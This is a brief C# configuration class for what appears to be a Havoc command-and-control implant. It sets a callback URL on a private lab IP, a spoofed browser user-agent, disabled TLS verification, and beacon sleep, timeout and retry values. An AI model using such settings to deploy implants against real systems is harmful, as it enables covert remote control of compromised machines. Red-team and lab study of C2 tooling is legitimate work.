using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace HavocImplant
{
    public class Config
    {
        static public string[] url = new string[] { "https://10.211.55.16/" };
        static public string userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36";
        static public bool secure = false;
        static public int sleepTime = 5000;
        static public int timeout = 15000;
        static public int maxTries = 5;
    }
}
